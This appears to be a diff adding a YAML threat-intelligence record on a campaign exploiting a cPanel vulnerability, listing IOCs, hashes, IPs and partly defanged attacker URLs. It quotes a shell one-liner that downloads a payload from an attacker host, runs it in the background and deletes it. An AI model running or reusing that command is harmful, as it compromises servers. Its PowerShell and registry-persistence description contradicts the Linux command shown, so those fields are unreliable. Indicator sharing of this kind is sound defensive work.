@@ -1,0 +1,59 @@
+title: 6Mr_Rot13cPanelCVE-2026-41940
+description: The report details a malware campaign that utilizes PowerShell for execution
+  and establishes persistence through registry keys.
+attribution: ''
+malware_families:
+- MaliciousLoader
+cves:
+- CVE-2026-41940
+ttps:
+  processes:
+  - powershell.exe
+  command_lines:
+  - F=/root/.u$$; (wget -q -O "$F" 'https://cp.dene.[de.com/Update' 2>/dev/null ||curl
+    -sk -o "$F" 'https://cp.dene.[de.com/Update') && chmod 755 "$F" && (nohup "$F"
+    -s >/dev/null 2>&1 &) && sleep 2; rm -f "$F"
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - https://cp.dene.[de.com/Update -> cp.dene.[de.com:443
+  - https://wrned.]com/api.php?t=3&c=1 -> wrned[.]com:443
+  - https://wpsock.]com/cpanel/install.sh -> wpsock[.]com:443
+  - powershell.exe -> wrned.com:443
+  file_activity:
+  - /root/.u$$
+  - /usr/local/cpanel/cgi-sys/cpanel.py
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - fb1bc3f935fdeb3555465070ba2db33c
+  - 9305b4ebbb4d39907cf36b62989a6af3
+  - 2286f126ab4740ccf2595ad1fa0c615c
+  - 29222f5e73dd10088fcf1204aa21f87f
+  - 45fc93426cf08f91c9f9de5f04a12263
+  - 711afb014f64c97d7b31685709c34ce7
+  - 22613c952459e65ce09fb6b5c1c03d47
+  - e49f68a363c867608972680799389daf
+  - e1ec6ebb96cf87c785ee6a7da677c059
+  - 02a5990b11293236e01f174f5999df20
+  - bae1f1bce7c82fa86f05b12e2e254cfc
+  ip_addresses:
+  - 178.249.209.182
+  - 149.102.229.146
+  domains:
+  - cp.dene.[de.com
+  - wrned[.]com
+  - wpsock[.]com
+  - wrned.com
+  urls:
+  - https://cp.dene.[de.com/Update
+  - https://wrned.]com/api.php?t=3&c=1
+  - https://wpsock.]com/cpanel/install.sh
+authors:
+- Ctrl-Alt-Intel54
+reference: https://blog.xlab.qianxin.com/mr_rot13-the-elusive-6-year-hacker-group-weaponizing-critical-cpanel-flaws-for-backdoor-deployment_cn/
+date_of_publication: May 11, 2026
+file_creation_date: May 14, 2026
